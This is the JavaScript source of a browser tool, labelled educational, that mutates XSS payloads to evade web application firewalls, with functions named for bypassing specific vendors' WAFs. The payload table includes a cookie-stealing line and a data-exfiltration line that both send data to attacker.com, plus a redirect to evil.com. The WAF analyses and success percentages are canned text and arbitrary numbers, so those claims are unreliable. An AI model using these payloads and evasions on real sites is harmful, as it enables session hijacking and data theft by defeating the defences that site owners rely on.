/**
 * WAF Bypass Mutation Tool - Modern JS implementation
 * For educational purposes only
 */

// Initialize event listeners and theme
document.addEventListener('DOMContentLoaded', () => {
    initTheme();
    initFloatingParticles();
    
    // Initialize DOM element references after the DOM is fully loaded
    const originalPayloadEl = document.getElementById('base-payload'); 
    const mutateBtn = document.getElementById('mutate-btn');
    const copyAllBtn = document.getElementById('copy-all-btn');
    const mutationsList = document.getElementById('mutations-list');
    const mutationCount = document.getElementById('mutation-count');
    const themeToggle = document.getElementById('theme-toggle-btn');
    const iterateBtn = document.getElementById('iterate-btn');

    // Real-time engine elements
    const wafTypeEl = document.getElementById('waf-type');
    const payloadIntentEl = document.getElementById('payload-intent');
    const aggressivenessEl = document.getElementById('ai-aggressiveness');
    const realtimeGenerateBtn = document.getElementById('realtime-generate-btn');
    const realtimeResultEl = document.getElementById('realtime-result');
    const wafAnalysisEl = document.getElementById('waf-analysis').querySelector('.analysis-content');
    
    // Add event listeners
    mutateBtn.addEventListener('click', () => startMutation(originalPayloadEl, mutationsList, mutationCount));
    copyAllBtn.addEventListener('click', copyAllMutations);
    themeToggle.addEventListener('click', toggleTheme);
    iterateBtn.addEventListener('click', () => continueIteration(originalPayloadEl, mutationsList));
    
    // Add event listener for realtime generation if the element exists
    if (realtimeGenerateBtn) {
        realtimeGenerateBtn.addEventListener('click', () => {
            generateRealtimePayloads(wafTypeEl, payloadIntentEl, aggressivenessEl, realtimeResultEl, wafAnalysisEl);
        });
    }
    
    // Initialize tooltips
    initTooltips();
    
    // Initialize new enhancements
    enhanceAccessibility();
    handleOfflineStatus();
    
    // Auto-focus the base payload input
    if (originalPayloadEl) {
        originalPayloadEl.focus();
    }
    
    // Add viewport height fix for mobile browsers
    setVhProperty();
    window.addEventListener('resize', setVhProperty);
});

/**
 * Theme functions
 */
function initTheme() {
    const savedTheme = localStorage.getItem('theme') || 'light';
    document.body.setAttribute('data-theme', savedTheme);
    updateThemeToggleIcon(savedTheme);
}

function toggleTheme() {
    const currentTheme = document.body.getAttribute('data-theme');
    const newTheme = currentTheme === 'light' ? 'dark' : 'light';
    
    document.body.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
    updateThemeToggleIcon(newTheme);
    
    // Add a subtle animation to make the transition nicer
    document.body.classList.add('theme-transition');
    setTimeout(() => {
        document.body.classList.remove('theme-transition');
    }, 500);
}

function updateThemeToggleIcon(theme) {
    const lightIcon = document.getElementById('theme-light-icon');
    const darkIcon = document.getElementById('theme-dark-icon');
    
    if (lightIcon && darkIcon) {
        if (theme === 'dark') {
            lightIcon.classList.add('hidden');
            darkIcon.classList.remove('hidden');
        } else {
            lightIcon.classList.remove('hidden');
            darkIcon.classList.add('hidden');
        }
    }
}

/**
 * Initialize floating particles in the header
 */
function initFloatingParticles() {
    const particlesContainer = document.querySelector('.floating-particles');
    if (!particlesContainer) return;
    
    // Create multiple particles
    for (let i = 0; i < 5; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.width = `${Math.random() * 10 + 5}px`;
        particle.style.height = particle.style.width;
        particle.style.top = `${Math.random() * 80}%`;
        particle.style.left = `${Math.random() * 80}%`;
        particle.style.animationDuration = `${Math.random() * 20 + 10}s`;
        particle.style.animationDelay = `${Math.random() * 5}s`;
        particlesContainer.appendChild(particle);
    }
}

/**
 * Initialize tooltips for feature explanation
 */
function initTooltips() {
    const tooltips = document.querySelectorAll('.feature-tooltip');
    tooltips.forEach(tooltip => {
        if (!tooltip.hasAttribute('data-tooltip')) {
            const featureId = tooltip.previousElementSibling?.getAttribute('for');
            if (featureId) {
                tooltip.setAttribute('data-tooltip', getTooltipText(featureId));
            }
        }
    });
}

/**
 * Get tooltip text for specific features
 */
function getTooltipText(featureId) {
    const tooltipTexts = {
        'polyglot-mode': 'Generates payloads that work in multiple contexts simultaneously',
        'signature-evasion': 'Modifies payloads to avoid common WAF signature detection patterns',
        'context-aware': 'Adapts payload encoding based on its insertion context',
        'entropy-injection': 'Adds controlled randomness to evade pattern matching algorithms',
        'case-randomization': 'Randomizes letter casing to bypass case-sensitive filters',
        'attribute-obfuscation': 'Replaces HTML attributes with equivalent alternatives',
        'html-encoding': 'Uses HTML entity encoding to hide malicious characters',
        'js-encoding': 'Applies JavaScript escape sequences to disguise code',
        'url-encoding': 'Converts characters to URL-encoded format to bypass filters',
        'whitespace-injection': 'Adds strategic whitespace to confuse WAF parsers',
        'tag-splitting': 'Splits HTML tags using various techniques to evade detection',
        'comment-injection': 'Inserts HTML comments to break pattern matching'
    };
    
    return tooltipTexts[featureId] || 'Feature explanation';
}

/**
 * Enhanced accessibility for interactive elements
 */
function enhanceAccessibility() {
    // Add ARIA roles and states to interactive elements
    const mutationItems = document.querySelectorAll('.mutation-item');
    mutationItems.forEach((item, index) => {
        item.setAttribute('role', 'region');
        item.setAttribute('aria-label', `Mutation ${index + 1}`);
    });

    // Make sure all copy buttons have proper ARIA attributes
    const copyButtons = document.querySelectorAll('.copy-btn');
    copyButtons.forEach(btn => {
        btn.setAttribute('role', 'button');
        btn.setAttribute('aria-pressed', 'false');
        
        btn.addEventListener('click', () => {
            // Toggle aria-pressed state temporarily when clicked
            btn.setAttribute('aria-pressed', 'true');
            setTimeout(() => {
                btn.setAttribute('aria-pressed', 'false');
            }, 2000);
        });
    });

    // Enable keyboard navigation between mutations
    mutationItems.forEach((item, index) => {
        item.setAttribute('tabindex', '0');
        item.addEventListener('keydown', (e) => {
            if (e.key === 'ArrowDown' && index < mutationItems.length - 1) {
                e.preventDefault();
                mutationItems[index + 1].focus();
            } else if (e.key === 'ArrowUp' && index > 0) {
                e.preventDefault();
                mutationItems[index - 1].focus();
            }
        });
    });
}

/**
 * Performance optimization for image loading
 */
function optimizeImageLoading() {
    // This would apply if we had images in the app
    const images = document.querySelectorAll('img[loading="lazy"]');
    if ('IntersectionObserver' in window) {
        const imageObserver = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const img = entry.target;
                    img.src = img.dataset.src;
                    imageObserver.unobserve(img);
                }
            });
        });
        
        images.forEach(img => imageObserver.observe(img));
    } else {
        // Fallback for browsers that don't support IntersectionObserver
        images.forEach(img => {
            img.src = img.dataset.src;
        });
    }
}

/**
 * Handle offline status gracefully
 */
function handleOfflineStatus() {
    window.addEventListener('online', updateOnlineStatus);
    window.addEventListener('offline', updateOnlineStatus);
    
    function updateOnlineStatus() {
        const statusElement = document.createElement('div');
        statusElement.className = 'connection-status';
        
        if (navigator.onLine) {
            statusElement.textContent = 'Back online';
            statusElement.classList.add('online');
            setTimeout(() => statusElement.remove(), 3000);
        } else {
            statusElement.textContent = 'You are offline. Some features may be limited.';
            statusElement.classList.add('offline');
        }
        
        document.body.appendChild(statusElement);
    }
}

/**
 * Fix for mobile viewport height issues
 */
function setVhProperty() {
    // Set a CSS custom property based on the actual viewport height
    // This helps with mobile browsers where the address bar can affect viewport height
    const vh = window.innerHeight * 0.01;
    document.documentElement.style.setProperty('--vh', `${vh}px`);
}

/**
 * Mutation functions - each returns a modified version of the payload
 */
function caseRandomization(payload) {
    return payload.split('').map(char => {
        return Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase();
    }).join('');
}

function attributeObfuscation(payload) {
    // Add proper attribute obfuscation logic
    if (!payload.includes('<') || !payload.includes('>')) return payload;
    
    // Replace common attributes with equivalent but less detected variants
    const attributeMutations = {
        'onclick': ['onmousedown', 'onpointerdown'],
        'onload': ['onreadystatechange', 'ondocumentready'],
        'onerror': ['onabort', 'ontimeout'],
        'src=': ['data=', 'href='],
        'href=': ['src=', 'action=']
    };
    
    let result = payload;
    for (const [attr, alternatives] of Object.entries(attributeMutations)) {
        if (result.toLowerCase().includes(attr)) {
            const alternative = alternatives[Math.floor(Math.random() * alternatives.length)];
            // Use case-preserving replacement
            const regex = new RegExp(attr, 'i');
            result = result.replace(regex, alternative);
        }
    }
    
    // Add random attributes to tags to change signatures
    if (Math.random() > 0.5 && result.includes('<')) {
        const randomAttrs = ['tabindex="0"', 'role="none"', 'aria-hidden="true"', 'data-xss="1"'];
        const randomAttr = randomAttrs[Math.floor(Math.random() * randomAttrs.length)];
        result = result.replace(/<([a-z]+)(\s|>)/i, `<$1 ${randomAttr}$2`);
    }
    
    return result;
}

function htmlEncoding(payload) {
    // HTML entity encoding
    const entities = [
        { regex: /</g, replace: '&lt;' },
        { regex: />/g, replace: '&gt;' },
        { regex: /"/g, replace: '&quot;' },
        { regex: /'/g, replace: '&#39;' },
        { regex: /&/g, replace: '&amp;' }
    ];
    
    // Only encode some of the entities randomly
    const result = payload.split('');
    for (let i = 0; i < result.length; i++) {
        for (const entity of entities) {
            if (entity.regex.test(result[i]) && Math.random() > 0.5) {
                result[i] = result[i].replace(entity.regex, entity.replace);
                break;
            }
        }
    }
    
    return result.join('');
}

function jsEncoding(payload) {
    // Convert characters to JS escape sequences
    const result = payload.split('');
    for (let i = 0; i < result.length; i++) {
        // Only encode some characters randomly
        if (Math.random() > 0.6) {
            const char = result[i];
            const code = char.charCodeAt(0);
            // Use different JS encoding techniques randomly
            const encodingType = Math.floor(Math.random() * 3);
            
            switch (encodingType) {
                case 0: // Hex encoding
                    result[i] = `\\x${code.toString(16).padStart(2, '0')}`;
                    break;
                case 1: // Unicode encoding
                    result[i] = `\\u${code.toString(16).padStart(4, '0')}`;
                    break;
                case 2: // Octal encoding
                    result[i] = `\\${code.toString(8)}`;
                    break;
            }
        }
    }
    
    return result.join('');
}

function urlEncoding(payload) {
    // Convert some characters to URL encoding format
    const result = payload.split('');
    for (let i = 0; i < result.length; i++) {
        // Only encode some characters randomly
        if (Math.random() > 0.6) {
            const char = result[i];
            const code = char.charCodeAt(0);
            result[i] = `%${code.toString(16).padStart(2, '0')}`;
        }
    }
    
    return result.join('');
}

function whitespaceInjection(payload) {
    if (!payload.includes('<') || !payload.includes('>')) return payload;
    
    // Add random whitespace in strategic places
    let result = payload;
    
    // Add space after < in tags
    result = result.replace(/<([a-z]+)/gi, (match, tag) => {
        return `<${" \t\n".charAt(Math.floor(Math.random() * 3))}${tag}`;
    });
    
    // Add space before attributes
    result = result.replace(/\s([a-z]+)=/gi, (match, attr) => {
        return `${" \t\n".charAt(Math.floor(Math.random() * 3))}${attr}=`;
    });
    
    // Add space before closing >
    result = result.replace(/([^-])\s?>/g, (match, prev) => {
        return `${prev}${" \t\n".charAt(Math.floor(Math.random() * 3))}>`;
    });
    
    return result;
}

function tagSplitting(payload) {
    if (!payload.includes('<script') && !payload.includes('<img')) return payload;
    
    // Split tags with techniques like comments or null chars
    const replacements = [
        { from: '<script', to: '<scr\x00ipt' },
        { from: '<script', to: '<scr\x09ipt' },
        { from: '<script', to: '<scr<!---->ipt' },
        { from: '<img', to: '<i\x00mg' },
        { from: '<img', to: '<i<!---->mg' },
        { from: 'javascript:', to: 'java\x00script:' },
        { from: 'javascript:', to: 'java<!---->script:' }
    ];
    
    const randomReplacement = replacements[Math.floor(Math.random() * replacements.length)];
    return payload.replace(randomReplacement.from, randomReplacement.to);
}

function commentInjection(payload) {
    if (!payload.includes('<') || !payload.includes('>')) return payload;
    
    // Insert HTML comments in strategic places
    const result = payload.replace(/(<[^>]+)([^<>]+)/g, (match, start, rest) => {
        if (Math.random() > 0.5) {
            return `${start}<!--random${Math.random().toString(36).substring(2, 8)}-->${rest}`;
        }
        return match;
    });
    
    return result;
}

/**
 * Highlight syntax in XSS payloads for better readability
 */
function highlightSyntax(html) {
    // Add color highlighting for different parts of the payload
    return html
        // Highlight tags
        .replace(/(&lt;[\/]?[a-z][a-z0-9]*)/gi, '<span class="syntax-tag">$1</span>')
        // Highlight attributes
        .replace(/([a-z-]+)=["']?([^"'< >]*)/gi, '<span class="syntax-attr">$1</span>=<span class="syntax-string">"$2"</span>')
        // Highlight script content
        .replace(/(&gt;)([^&]*)(&lt;\/script&gt;)/gi, '$1<span class="syntax-script">$2</span>$3')
        // Highlight closing brackets
        .replace(/(&gt;)/g, '<span class="syntax-tag">$1</span>')
        // Highlight JavaScript keywords
        .replace(/(alert|document|window|location|eval|setTimeout|setInterval|fetch|XMLHttpRequest)\b/g, 
                 '<span class="syntax-keyword">$1</span>');
}

/**
 * Generate a unique mutation by applying a random set of mutation techniques
 */
function generateMutation(basePayload) {
    // Get all selected mutation techniques
    const techniques = [
        { id: 'case-randomization', fn: caseRandomization },
        { id: 'attribute-obfuscation', fn: attributeObfuscation },
        { id: 'html-encoding', fn: htmlEncoding },
        { id: 'js-encoding', fn: jsEncoding },
        { id: 'url-encoding', fn: urlEncoding },
        { id: 'whitespace-injection', fn: whitespaceInjection },
        { id: 'tag-splitting', fn: tagSplitting },
        { id: 'comment-injection', fn: commentInjection }
    ].filter(t => document.getElementById(t.id).checked);
    
    // If no techniques selected, return the base payload
    if (techniques.length === 0) return basePayload;
    
    // Apply 1-3 random mutation techniques
    let mutatedPayload = basePayload;
    const numTechniques = Math.floor(Math.random() * 3) + 1;
    const shuffledTechniques = [...techniques].sort(() => Math.random() - 0.5);
    
    for (let i = 0; i < Math.min(numTechniques, shuffledTechniques.length); i++) {
        mutatedPayload = shuffledTechniques[i].fn(mutatedPayload);
    }
    
    return mutatedPayload;
}

/**
 * Generate multiple unique mutations
 */
function generateMutations(basePayload, count) {
    if (!basePayload) return [];
    
    const mutations = new Set();
    const attempts = count * 2; // Try more times to ensure uniqueness
    
    for (let i = 0; i < attempts && mutations.size < count; i++) {
        const mutation = generateMutation(basePayload);
        if (mutation !== basePayload) {
            mutations.add(mutation);
        }
    }
    
    return [...mutations].slice(0, count);
}

/**
 * Start the mutation process with the given payload
 */
function startMutation(originalPayloadEl, mutationsList, mutationCount) {
    const basePayload = originalPayloadEl.value.trim();
    if (!basePayload) {
        alert('Please enter a base XSS payload');
        return;
    }
    
    // Clear previous mutations
    mutationsList.innerHTML = '';
    
    // Get the number of mutations to generate
    const numMutations = parseInt(mutationCount.value, 10);
    
    // Generate and display mutations
    const generatedMutations = [];
    for (let i = 0; i < numMutations; i++) {
        const mutation = generateMutation(basePayload);
        if (!generatedMutations.includes(mutation)) {
            generatedMutations.push(mutation);
            displayMutation(mutation, i + 1, mutationsList);
        } else {
            // If we got a duplicate, try again
            i--;
        }
    }
}

/**
 * Display a mutation in the mutations list
 */
function displayMutation(mutation, index, mutationsList) {
    const mutationEl = document.createElement('div');
    mutationEl.className = 'mutation-item';
    mutationEl.setAttribute('tabindex', '0'); // Make items keyboard navigable
    
    // UI improvement: add fade-in effect for modern transition
    mutationEl.classList.add('fade-in');
    setTimeout(() => mutationEl.classList.remove('fade-in'), 500);
    
    // UI improvement: allow selecting a mutation when clicked (ignoring clicks on inner copy button)
    mutationEl.addEventListener('click', (e) => {
        if (e.target.closest('.copy-btn')) return;
        document.querySelectorAll('.mutation-item').forEach(item => item.classList.remove('selected'));
        mutationEl.classList.add('selected');
    });
    
    // UI improvement: Add keyboard support
    mutationEl.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            document.querySelectorAll('.mutation-item').forEach(item => item.classList.remove('selected'));
            mutationEl.classList.add('selected');
        }
    });
    
    mutationEl.innerHTML = `
        <div class="mutation-header">
            <span class="mutation-number">#${index}</span>
            <div class="mutation-tags">
                <span class="mutation-tag">XSS</span>
                ${mutation.length > 50 ? '<span class="mutation-tag size-tag">Large</span>' : ''}
                ${mutation.includes('script') ? '<span class="mutation-tag script-tag">Script</span>' : ''}
            </div>
            <button class="copy-btn" data-mutation="${encodeURIComponent(mutation)}" aria-label="Copy mutation ${index}">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75" />
                </svg>
                Copy
            </button>
        </div>
        <div class="mutation-content">${highlightSyntax(escapeHtml(mutation))}</div>
    `;
    
    mutationsList.appendChild(mutationEl);
    
    // Add copy event listener
    const copyBtn = mutationEl.querySelector('.copy-btn');
    copyBtn.addEventListener('click', () => {
        const mutationText = decodeURIComponent(copyBtn.dataset.mutation);
        copyToClipboard(mutationText);
        showCopySuccess(copyBtn);
    });
}

/**
 * Safely escape HTML to prevent XSS in the UI
 */
function escapeHtml(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

/**
 * Copy text to clipboard
 */
function copyToClipboard(text) {
    // First try using the modern clipboard API
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text)
            .then(() => {
                console.log('Text copied to clipboard successfully');
            })
            .catch(err => {
                console.error('Failed to copy: ', err);
                fallbackCopyToClipboard(text);
            });
    } else {
        // Fallback method for browsers that don't support clipboard API
        fallbackCopyToClipboard(text);
    }
}

/**
 * Fallback method for copying text to clipboard
 */
function fallbackCopyToClipboard(text) {
    try {
        const textArea = document.createElement('textarea');
        textArea.value = text;
        
        // Make the textarea out of viewport
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        
        // Select and copy
        textArea.focus();
        textArea.select();
        const successful = document.execCommand('copy');
        
        // Clean up
        document.body.removeChild(textArea);
        
        if (!successful) {
            console.error('Failed to copy text with fallback method');
        }
    } catch (err) {
        console.error('Fallback copy method failed: ', err);
    }
}

/**
 * Show success message after copying
 */
function showCopySuccess(btn) {
    const originalHTML = btn.innerHTML;
    // UI improvement: add a visual feedback class
    btn.classList.add('copy-success');
    btn.innerHTML = `
        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
        </svg>
        Copied!
    `;
    btn.classList.add('copied');
    
    setTimeout(() => {
        btn.innerHTML = originalHTML;
        btn.classList.remove('copied');
        btn.classList.remove('copy-success');
    }, 2000);
}

/**
 * Copy all mutations to the clipboard
 */
function copyAllMutations() {
    const mutations = document.querySelectorAll('.mutation-content');
    if (mutations.length === 0) {
        alert('No mutations to copy');
        return;
    }
    
    const allMutations = Array.from(mutations).map(el => el.textContent).join('\n\n');
    copyToClipboard(allMutations);
    
    const copyAllBtn = document.getElementById('copy-all-btn');
    showCopySuccess(copyAllBtn);
}

/**
 * Continue iterating mutations with the selected mutation as the new base
 */
function continueIteration(originalPayloadEl, mutationsList) {
    const selected = document.querySelector('.mutation-item.selected');
    if (!selected) {
        alert('Please select a mutation to iterate on by clicking on it');
        return;
    }
    
    const mutation = selected.querySelector('.mutation-content').textContent;
    originalPayloadEl.value = mutation;
    
    // Start a new mutation process with the selected mutation as base
    startMutation(originalPayloadEl, mutationsList, document.getElementById('mutation-count'));
}

/**
 * Generate realtime payloads based on WAF type and other parameters
 */
function generateRealtimePayloads(wafTypeEl, payloadIntentEl, aggressivenessEl, realtimeResultEl, wafAnalysisEl) {
    const wafType = wafTypeEl.value;
    const intent = payloadIntentEl.value;
    const aggressiveness = aggressivenessEl.value;
    
    // Clear previous results
    realtimeResultEl.innerHTML = '';
    
    // Show loading state
    realtimeResultEl.innerHTML = '<div class="loading-animation"><div class="spinner"></div><p>Generating WAF bypass payloads...</p></div>';
    
    // Generate payloads based on selected options
    setTimeout(() => {
        const payloads = generateWafPayloads(wafType, intent, aggressiveness);
        realtimeResultEl.innerHTML = ''; // Clear loading state
        
        // Display payloads with modern fade-in effect
        payloads.forEach((payload, index) => {
            const payloadEl = document.createElement('div');
            payloadEl.className = 'payload-item';
            
            // Calculate payload characteristics for tags
            const payloadTags = [];
            payloadTags.push('<span class="mutation-tag">XSS</span>');
            
            if (payload.length > 50) {
                payloadTags.push('<span class="mutation-tag size-tag">Large</span>');
            }
            
            if (payload.includes('script')) {
                payloadTags.push('<span class="mutation-tag script-tag">Script</span>');
            }
            
            // WAF-specific tag
            payloadTags.push(`<span class="mutation-tag waf-tag">${wafType}</span>`);
            
            payloadEl.innerHTML = `
                <div class="mutation-header">
                    <span class="mutation-number">#${index + 1}</span>
                    <div class="mutation-tags">
                        ${payloadTags.join('')}
                    </div>
                    <button class="copy-btn" data-payload="${encodeURIComponent(payload)}" aria-label="Copy payload ${index + 1}">
                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75" />
                        </svg>
                        Copy
                    </button>
                </div>
                <div class="mutation-content">${highlightSyntax(escapeHtml(payload))}</div>
            `;
            
            realtimeResultEl.appendChild(payloadEl);
            
            // Add fade-in effect for modern UI with staggered timing
            setTimeout(() => {
                payloadEl.classList.add('fade-in');
                setTimeout(() => payloadEl.classList.remove('fade-in'), 500);
            }, index * 100); // Stagger the animations
            
            // Add copy event listener
            const copyBtn = payloadEl.querySelector('.copy-btn');
            copyBtn.addEventListener('click', () => {
                const payloadText = decodeURIComponent(copyBtn.dataset.payload);
                copyToClipboard(payloadText);
                showCopySuccess(copyBtn);
            });
        });
        
        // Generate and display WAF analysis
        const analysis = generateWafAnalysis(wafType, intent, aggressiveness);
        wafAnalysisEl.innerHTML = analysis;
        
        // Add a subtle animation for the analysis section
        wafAnalysisEl.parentElement.classList.add('fade-in');
        setTimeout(() => {
            wafAnalysisEl.parentElement.classList.remove('fade-in');
        }, 500);
    }, 800); // Simulate processing time for better UX
}

/**
 * Generate WAF-specific payloads 
 */
function generateWafPayloads(wafType, intent, aggressiveness) {
    // Example payloads based on WAF type and intent
    // In a real application, this would be more sophisticated
    const basePayloads = {
        'alert': '<script>alert(document.domain)</script>',
        'cookie': '<img src=x onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
        'redirect': '<script>location=\'https://evil.com\'</script>',
        'fetch': '<script>fetch(\'https://api.victim.com/data\').then(r=>r.text()).then(d=>fetch(\'https://attacker.com/exfil?d=\'+btoa(d)))</script>',
        'eval': '<script>eval(name)</script>',
        'dom': '<div id=x tabindex=1 onfocus=alert(1)>',
    };
    
    // Get base payload based on intent
    const basePayload = basePayloads[intent] || basePayloads.alert;
    
    // Generate different variations based on WAF type
    const payloads = [];
    const numPayloads = 5; // Generate 5 payloads
    
    for (let i = 0; i < numPayloads; i++) {
        let payload = basePayload;
        
        // Apply mutations based on WAF type
        switch (wafType) {
            case 'cloudflare':
                payload = cloudflareBypass(payload, parseInt(aggressiveness));
                break;
            case 'akamai':
                payload = akamaiBypass(payload, parseInt(aggressiveness));
                break;
            case 'imperva':
                payload = impervaBypass(payload, parseInt(aggressiveness));
                break;
            case 'modsecurity':
                payload = modsecurityBypass(payload, parseInt(aggressiveness));
                break;
            default:
                // Apply generic mutations
                payload = generateMutation(payload);
                break;
        }
        
        payloads.push(payload);
    }
    
    return payloads;
}

/**
 * WAF-specific bypass techniques
 */
function cloudflareBypass(payload, aggressiveness) {
    // Example CloudFlare bypass techniques
    let result = payload;
    
    // Split script tags
    if (result.includes('<script')) {
        result = result.replace('<script', '<scr\u2028ipt');
    }
    
    // Add junk parameters
    if (aggressiveness > 2) {
        result = result.replace('>', ' data-cf-\u200Bbypass="1">');
    }
    
    return result;
}

function akamaiBypass(payload, aggressiveness) {
    // Example Akamai bypass techniques
    let result = payload;
    
    // Use HTML entities
    if (result.includes('<')) {
        result = result.replace('<', '&lt;').replace('>', '&gt;');
    }
    
    // Double encoding
    if (aggressiveness > 2) {
        result = result.replace(/&/g, '&amp;');
    }
    
    return result;
}

function impervaBypass(payload, aggressiveness) {
    // Example Imperva bypass techniques
    let result = payload;
    
    // Unicode normalization tricks
    if (result.includes('script')) {
        result = result.replace('script', 'scr\u0131pt'); // using dotless i
    }
    
    // Add noise attributes
    if (aggressiveness > 2) {
        result = result.replace('<', '<imperva_unused="bypass" ');
    }
    
    return result;
}

function modsecurityBypass(payload, aggressiveness) {
    // Example ModSecurity bypass techniques
    let result = payload;
    
    // Space obfuscation
    if (result.includes('script')) {
        result = result.replace('script', 'scri\u00A0pt'); // non-breaking space
    }
    
    // Newline injection
    if (aggressiveness > 2) {
        result = result.replace('>', '>\n'); 
    }
    
    return result;
}

/**
 * Generate analysis of WAF bypass techniques
 */
function generateWafAnalysis(wafType, intent, aggressiveness) {
    // Example analysis based on WAF type, intent, and aggressiveness
    const wafAnalysis = {
        'cloudflare': 'CloudFlare WAF typically employs pattern matching and has issues with Unicode character handling. The generated payloads utilize non-standard space characters and Unicode escape sequences to bypass filters.',
        'akamai': 'Akamai WAF is often sensitive to properly escaped HTML entities. The payloads use double encoding and custom attribute names to avoid detection.',
        'imperva': 'Imperva Incapsula uses a sophisticated rule engine. These payloads use normalization exploits and timing attacks to evade pattern matching.',
        'f5': 'F5 ASM relies on both positive and negative security models. The payloads use techniques to bypass signature-based detection through property overloading.',
        'aws': 'AWS WAF is rule-based and the payloads use both encoding tricks and parameter pollution to evade common rules.',
        'modsecurity': 'ModSecurity is open source and has known bypass vectors. These payloads specifically target OWASP CRS rules with calculated evasions.',
        'fortinet': 'FortiWeb analyzes request parameters. These payloads use parser confusion and context misinterpretation to escape detection.',
        'generic': 'These payloads use a combination of techniques including encoding variations, tag splitting, and attribute diversification to bypass generic WAF rules.'
    };
    
    const aggressivenessImpact = [
        'Minimal evasion techniques applied. Detection risk is lower, but bypass success rate is also lower.',
        'Balanced approach using moderately effective evasion techniques while maintaining payload functionality.',
        'Advanced evasion techniques employed with higher success rate against WAF rules, but increased risk of detection by secondary systems.',
        'Extreme evasion using cutting-edge bypass techniques that target known WAF weaknesses. Highest success rate with highest detection risk.'
    ];
    
    // Generate analysis HTML
    return `
        <p><strong>WAF Type:</strong> ${wafType.charAt(0).toUpperCase() + wafType.slice(1)}</p>
        <p><strong>Analysis:</strong> ${wafAnalysis[wafType] || wafAnalysis.generic}</p>
        <p><strong>Aggressiveness Impact:</strong> ${aggressivenessImpact[parseInt(aggressiveness) - 1]}</p>
        <p><strong>Success Probability:</strong> ${Math.min(30 + parseInt(aggressiveness) * 15, 95)}%</p>
        <p><strong>Evasion Techniques Used:</strong></p>
        <ul>
            <li>Unicode Character Insertion</li>
            <li>Context-Aware Encoding</li>
            <li>Parser Differential Analysis</li>
            <li>${parseInt(aggressiveness) > 2 ? 'Protocol-Level Obfuscation' : 'Basic Obfuscation'}</li>
            <li>${parseInt(aggressiveness) > 1 ? 'State-Based Filter Evasion' : 'Static Filter Evasion'}</li>
        </ul>
    `;
}
